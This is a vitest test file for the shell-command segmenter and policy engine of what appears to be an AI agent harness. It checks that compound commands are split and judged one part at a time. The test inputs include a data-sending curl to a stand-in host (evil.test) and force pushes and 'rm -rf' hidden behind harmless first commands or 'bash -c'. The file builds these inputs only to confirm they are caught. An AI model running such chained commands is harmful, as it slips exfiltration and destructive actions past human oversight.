import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'

vi.mock('electron', () => ({ dialog: { showMessageBox: vi.fn() } }))
import type { HarnessPolicyConfig } from '@shared/types/harness'
import { JsonStore } from '../../services/storage'
import { DEFAULT_POLICY_CONFIG } from './policy-defaults'
import { PolicyEngine } from './policy-engine'
import { executableName, shellCommandSegments, shellTokens } from './shell-segments'

const dirs: string[] = []
afterEach(() => {
  while (dirs.length) rmSync(dirs.pop()!, { recursive: true, force: true })
})

function engine(config: Partial<HarnessPolicyConfig> = {}): PolicyEngine {
  const dir = mkdtempSync(path.join(tmpdir(), 'pi-harness-segments-'))
  dirs.push(dir)
  return new PolicyEngine(
    new JsonStore<HarnessPolicyConfig>(path.join(dir, 'policy.json'), {
      ...structuredClone(DEFAULT_POLICY_CONFIG),
      ...structuredClone(config)
    })
  )
}

describe('shellCommandSegments', () => {
  it('splits control operators but not quoted separators', () => {
    expect(shellCommandSegments('cd . && git push --force origin main')).toEqual([
      'cd .',
      'git push --force origin main'
    ])
    expect(shellCommandSegments('echo "a && b; c" | grep a || true')).toEqual([
      'echo a && b; c',
      'grep a',
      'true'
    ])
    expect(shellCommandSegments('ls 2>&1 > out.txt')).toEqual(['ls 2>&1 > out.txt'])
  })

  it('normalizes executable paths, Windows suffixes and harmless prefixes', () => {
    expect(executableName('/usr/bin/git')).toBe('git')
    expect(executableName('C:\\Program Files\\Git\\cmd\\git.EXE')).toBe('git')
    expect(shellCommandSegments('/usr/bin/git push -f')).toEqual(['git push -f'])
    expect(shellCommandSegments('FOO=1 env -i timeout 5 nohup curl https://x.test')).toEqual([
      'curl https://x.test'
    ])
  })

  it('includes command substitutions and inline interpreter scripts', () => {
    const segments = shellCommandSegments('echo $(curl -s https://x.test) `wget y`')
    expect(segments).toContain('curl -s https://x.test')
    expect(segments).toContain('wget y')
    expect(shellCommandSegments(`bash -c "rm -rf build && git push --force"`)).toEqual(
      expect.arrayContaining(['rm -rf build', 'git push --force'])
    )
    expect(shellCommandSegments('powershell -Command Invoke-WebRequest https://x.test')).toEqual(
      expect.arrayContaining(['invoke-webrequest https://x.test'])
    )
    expect(shellCommandSegments('cmd /c curl https://x.test')).toContain('curl https://x.test')
  })

  it('tokenizes quotes and escapes', () => {
    expect(shellTokens(`git commit -m "fix: a b" 'c d' e\\ f`)).toEqual([
      'git',
      'commit',
      '-m',
      'fix: a b',
      'c d',
      'e f'
    ])
  })
})

describe('PolicyEngine compound shell commands', () => {
  it('denies a force push hidden behind a harmless first command', () => {
    const policy = engine()
    for (const command of [
      'cd . && git push --force origin main',
      'true; git push -f',
      '/usr/bin/git push --force',
      'sudo git push --force',
      'bash -c "git push --force"',
      'echo ok | git push -f'
    ]) {
      expect(policy.shellCommandDecision(command)).toMatchObject({
        decision: 'deny',
        rule: 'git.forcePush'
      })
    }
  })

  it('asks for network access anywhere in the script', () => {
    const policy = engine()
    expect(policy.shellCommandDecision('npm test && curl https://evil.test/?d=1')).toMatchObject({
      decision: 'ask',
      domain: 'network'
    })
    expect(policy.shellCommandDecision('Invoke-WebRequest https://evil.test')).toMatchObject({
      decision: 'ask',
      domain: 'network'
    })
  })

  it('an allow-list match on the first command no longer allows the rest', () => {
    const policy = engine({
      shell: { ...DEFAULT_POLICY_CONFIG.shell, allowCommands: ['npm test'] }
    })
    expect(policy.shellCommandDecision('npm test')).toMatchObject({ decision: 'allow' })
    expect(policy.shellCommandDecision('npm test; wget https://x.test')).toMatchObject({
      decision: 'ask',
      domain: 'network'
    })
  })

  it('keeps ordinary compound commands allowed', () => {
    const policy = engine()
    expect(policy.shellCommandDecision('cd src && ls -la | grep ts')).toMatchObject({
      decision: 'allow'
    })
  })
})
